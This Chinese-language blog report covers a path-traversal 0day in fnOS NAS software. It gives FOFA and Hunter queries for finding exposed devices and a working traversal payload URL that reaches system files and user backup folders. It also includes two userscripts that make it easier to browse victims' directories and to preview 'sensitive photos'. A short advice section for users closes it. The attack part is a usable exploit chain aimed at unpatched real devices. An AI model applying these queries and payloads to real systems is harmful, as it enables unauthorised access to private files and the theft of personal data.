---
title: "飞牛OS (fnOS) 目录遍历 0day 漏洞复现与分析报告"
date: 2026-02-03
---
# 飞牛OS (fnOS) 目录遍历 0day 漏洞复现与分析报告

## 0x01 背景概述

**[官方公告链接](https://club.fnnas.com/forum.php?mod=viewthread&tid=53420)**
2026年2月1日，飞牛OS (fnOS) 被曝存在高危 0day 漏洞。攻击者通过该漏洞可以绕过身份验证，随意访问 NAS 上的任意系统文件及用户数据。本文旨在复现该漏洞原理，供广大安全爱好者学习交流，请勿用于非法用途。

---

## 0x02 漏洞复现原理

该漏洞的核心在于 **路径遍历 (Path Traversal)**。飞牛 OS 的 `app-center-static` 模块在处理静态资源请求时，未对 `size` 参数进行严格的过滤与合规性检查。

### 步骤 1：筛选暴露在公网的受影响资产

利用网络空间测绘引擎，可以快速定位全球范围内开启了 Web 服务的飞牛 OS 实例。

* **方法一：使用 Hunter (鹰图)**
* 查询语法：`iweb.title="飞牛" and ip.port=="5667" and ip.state="beijing"`
* **原理：** 针对特定标题、默认 HTTPS 端口（5667） 及地理位置进行组合搜索。


* **方法二：使用 FOFA**
* 查询语法：`icon_hash="470295793"`
* **原理：** 通过飞牛 OS 的 Favicon 图标哈希值进行精准匹配。



### 步骤 2：构造利用链接进行越权访问

找到尚未升级补丁的目标用户，进入登录页面后，将 URL 中的 `/login` 替换为特定的 LFI (Local File Inclusion) 负载路径。

* **核心 Payload：**
` /app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../`
* **利用原理：**
URL 中的 `%7B0%7D` 代表占位符 `{0}`。通过在 `size` 参数中输入连续的 `../`，攻击者可以跳出预设的静态资源目录，直接访问 Linux 系统根目录。
* **实战示例：**
若需访问 `vol2` 下的特定备份文件夹，链接如下：
`https://[Target_IP]:5667/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../vol2/1000/hdd5/backup/`

---

## 0x03 辅助渗透工具 (油猴脚本)

为了提高在目录遍历过程中的验证效率，可配合以下两款工具使用。

### 1. 路径遍历链接修复工具

**功能：** 解决在遍历状态下点击文件夹链接导致 404 的问题，自动补全拼接路径。

```js
// ==UserScript==
// @name 路径遍历链接修复工具
// @namespace http://tampermonkey.net/
// @version 1.0
// @description 修复特定路径下的 LFI/目录遍历链接拼接问题
// @author xxx
// @match *://*/app-center-static/serviceicon/myapp/%7B0%7D/*
// @grant none
// ==/UserScript==

(function() {
'use strict';

// 获取当前页面的查询参数，即 ?size=../../../../ 部分
const currentSearch = window.location.search;
// 获取当前页面的基础路径，即 /app-center-static/serviceicon/myapp/%7B0%7D/
const currentPath = window.location.pathname;

// 选取所有的 <a> 标签
const links = document.querySelectorAll('a');

links.forEach(link => {
// 获取 HTML 中原本的 href 属性值（例如 "vol1/" 或 "bin"），而非浏览器解析后的完整 URL
const rawHref = link.getAttribute('href');

if (rawHref) {
// 核心逻辑：基础路径 + 原有查询参数 + 目标文件路径
// 结果：.../myapp/%7B0%7D/?size=../../../../vol1/
const newUrl = currentPath + currentSearch + rawHref;

// 修改链接的指向
link.href = newUrl;
}
});

console.log(`已修正 ${links.length} 个路径遍历链接。`);
})();

```

### 2. 链接下方直接插入缩略图

**功能：** 自动识别图片格式链接并在其下方显示预览图，方便快速扫视敏感照片。

```js
// ==UserScript==
// @name 飞牛图片快速预览助手
// @match *://*/app-center-static/serviceicon/myapp/*
// @grant none
// ==/UserScript==

(function() {
    'use strict';
    // 1. 找到所有图片链接 (以 JPG, PNG 等结尾)
    const links = document.querySelectorAll('a');

    links.forEach(link => {
        const href = link.href.toLowerCase();
        if (href.match(/\.(jpg|jpeg|png|gif|webp)$/)) {
            // 2. 在链接下方直接插入一个缩略图
            const img = document.createElement('img');
            img.src = link.href;
            img.style.display = 'block';
            img.style.maxWidth = '200px'; // 缩略图大小
            img.style.margin = '10px 0';
            img.style.borderRadius = '5px';
            img.style.border = '1px solid #ccc';

            link.after(img); // 将图片放在链接后面
        }
    });
})();

```

---

## 0x04 安全建议

针对该 0day 漏洞，建议广大飞牛 OS 用户：

1. **立即升级：** 登录系统后台，确保安装 2026 年 2 月后的最新安全补丁。
2. **收缩公网暴露面：** 非必要不开启 5666/5667 端口的公网转发。
3. **定期自检：** 使用测绘引擎搜索个人 IP 或域名，查看指纹信息是否已被收录。
